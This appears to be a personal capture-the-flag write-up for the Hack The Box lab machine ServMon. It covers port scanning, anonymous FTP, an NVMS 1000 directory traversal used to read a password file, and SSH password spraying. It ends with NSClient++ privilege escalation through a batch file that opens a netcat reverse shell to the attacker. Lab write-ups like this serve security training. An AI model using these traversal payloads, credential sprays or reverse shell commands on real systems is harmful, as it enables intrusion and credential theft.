# Scope
10.129.227.77
# Information Gathering
## port discovery:
**tcp port scan:**
`sudo nmap -sS -Pn -p- -T5 -v 10.129.227.77 | grep "Discovered open port" | grep -oP 'port \K[0-9]+' > tcp-ports.txt`

```
$ cat tcp-ports.txt
21
22
80
445
139
135
49665
49669
8443
49664
49670
6063
6699
49666
49668
5666
49667
```

**udp port scan:**
`sudo nmap -sU -Pn -T5 -v 10.129.227.77 | grep "Discovered open port" | grep -oP 'port \K[0-9]+' > udp-ports.txt`

```
$ cat udp-ports.txt

```

## dns information:
`dig 10.129.227.77`

```
; <<>> DiG 9.20.20-1-Debian <<>> 10.129.227.77
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 2705
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;10.129.227.77.			IN	A

;; AUTHORITY SECTION:
.			86398	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2026032900 1800 900 604800 86400

;; Query time: 60 msec
;; SERVER: 192.168.18.1#53(192.168.18.1) (UDP)
;; WHEN: Sun Mar 29 19:59:49 EDT 2026
;; MSG SIZE  rcvd: 117
```

# Enumeration

## port enumeration:
**tcp port enumeration:**
`sudo nmap -sS -sV -sC -O -p $(paste -sd, tcp-ports.txt) -T5 -v 10.129.227.77 -oN tcp-scan.txt`

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| http-methods:
|_  Supported Methods: GET
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:     1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
| SHA-1:   7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
|_SHA-256: a6b0 6b86 2352 4446 d65a 36da ca4f f145 d752 e5e9 fcc9 42b8 70be e52c 0237 291b
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.98%I=7%D=3/29%Time=69C9BD6F%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.98%T=SSL%I=7%D=3/29%Time=69C9BD78%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xa0\x02\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1
SF:\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r
SF:(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocum
SF:ent\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Leng
SF:th:\x2018\r\n\r\nDocument\x20not\x20found");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 1803 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-29T16:04:03
|_  start_date: N/A
|_clock-skew: -8h00m01s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

## ftp:

ftp anonymous logon allowed:
```
ftp -a 10.129.227.77
Connected to 10.129.227.77.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49679|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
```

We found to users:
- Nadine
- Nathan

In the Nadine user directory we found:
```
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49680|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
```

In the Nathan user directory:
```
ftp> cd ..
250 CWD command successful.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49683|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
```

```
$ cat "Notes to do.txt"
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

```
$ cat Confindential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

Considerations:
- NVMS - Network Video Management System? Still has public access.
- There is a secrets file. Possibly in Nathan's desktop 
- NSClient exists: Windows monitoring agent that is capable of monitoring Windows laptops, workstations, and servers

## ssh:

## smb:

all attempts to login failed:
```
┌──(philip㉿TLM-02)-[~/CTFs/HTB/ServMon]
└─$ smbclient -N -L \\\\10.129.227.77\\
session setup failed: NT_STATUS_ACCESS_DENIED
```

```
┌──(philip㉿TLM-02)-[~/CTFs/HTB/ServMon]
└─$ smbclient -L \\\\10.129.227.77\\
Password for [WORKGROUP\philip]:
session setup failed: NT_STATUS_ACCESS_DENIED

┌──(philip㉿TLM-02)-[~/CTFs/HTB/ServMon]
└─$ smbclient -U Nathan -L \\\\10.129.227.77\\
Password for [WORKGROUP\Nathan]:
session setup failed: NT_STATUS_LOGON_FAILURE

┌──(philip㉿TLM-02)-[~/CTFs/HTB/ServMon]
└─$ smbclient -U Nadine -L \\\\10.129.227.77\\
Password for [WORKGROUP\Nadine]:
session setup failed: NT_STATUS_LOGON_FAILURE
```
## http:

### port 80:

NVMS 1000 login panel found version 20150323.1

```
$ searchsploit NVMS 1000
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                | hardware/webapps/47774.txt
TVT NVMS 1000 - Directory Traversal            | hardware/webapps/48311.py
----------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Attempting PoC directory traversal
```
$ curl --path-as-is http://10.129.227.77/../../../../../../../../../../../../windows/win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
It works!

### port 8443:
NSClient++ found

```
$ searchsploit NSClient++
------------------------------------------- -------------------------------------
 Exploit Title                             |  Path
------------------------------------------- -------------------------------------
NSClient++ 0.5.2.35 - Authenticated RCE    | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation | windows/local/46802.txt
------------------------------------------- -------------------------------------
Shellcodes: No Results
Papers: No Results
```

# Exploitation

From the message Nadine wrote to Nathan we know that there's a `Passwords.txt` file in Nathan's Desktop.

```
curl --path-as-is http://10.129.227.77/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```

Found a list of passwords!!!

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Let's try to use these creds against SSH,SMB and the NSClient

**ssh**
```
$ netexec ssh 10.129.227.77 -u users.txt -p passwords.txt --continue-on-success
SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:L1k3B1gBut7s@W0rk
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:0nly7h3y0unGWi11F0l10w
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:IfH3s4b0Utg0t0H1sH0me
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:Gr4etN3w5w17hMySk1Pa5$
```

## initial access

using the following creds `nadine:L1k3B1gBut7s@W0rk`

`ssh nadine@10.129.227.77`

```
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

# Post Exploitation

ew2x6SsGTxjRwXOT

Let's see if we can use that NVMS vuln to escalate privileges.

`searchsploit -m windows/local/46802.txt`

Following the instructions in the text file:

1. On the windows machine grab the NSClient admin password:
```
nadine@SERVMON C:\Users\Nadine\Desktop>cd "C:\Program Files\NSClient++"

nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

Let's also check additional information in the `nsclient.ini`

```
...
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...
; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled
...
```

We can see that the necessary plugins are already enabled and that only localhost is allowed to access it. 

2. Setup ssh port forward to access NSClient
`ssh -L 9999:127.0.0.1:8443 nadine@10.129.227.77`
remember to connect via `127.0.0.1:9999` in your browser

3. Create and transfer a .bat payload to `C:\temp`

create reverse_shell.bat file and put this inside it:
```
@echo off
C:\Temp\nc.exe <your-ip> 443 -e cmd.exe
```

transfer the files:
`scp reverse_shell.bat Nadine@10.129.227.77:`
`scp /usr/share/windows-binaries/nc.exe Nadine@10.129.227.77:`

4. Setup `netcat` listener on your machine:
`nc -nvlp 443`

5. Add script foobar to call evil.bat and save settings
![[Pasted image 20260330172349.png]]
6. Add schedulede to call script every 10 seconds and save settings
![[Pasted image 20260330170848.png]]

![[Pasted image 20260330171152.png]]
6. Restart the computer and wait for the reverse shell on attacking machine


```
ew2x6SsGTxjRwXOT
```

```
L1k3B1gBut7s@W0rk
```
